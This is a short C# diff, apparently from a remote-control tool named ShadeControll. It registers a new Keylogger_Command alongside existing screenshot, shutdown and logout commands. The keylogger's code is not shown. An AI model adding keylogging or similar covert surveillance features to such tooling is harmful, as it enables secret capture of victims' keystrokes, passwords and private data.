@@ -11,7 +11,8 @@ namespace ShadeControll.Commands
 
         public static Command[] AvailableCommands = {
             new Help_Command(),new Logout_Command(),new Screenshot_Command(),
-            new ShutDown_Command(),new Test_Command(), new Webpage_Command()
+            new ShutDown_Command(),new Test_Command(), new Webpage_Command(),
+            new Keylogger_Command()
         };
 
         public Command() { }
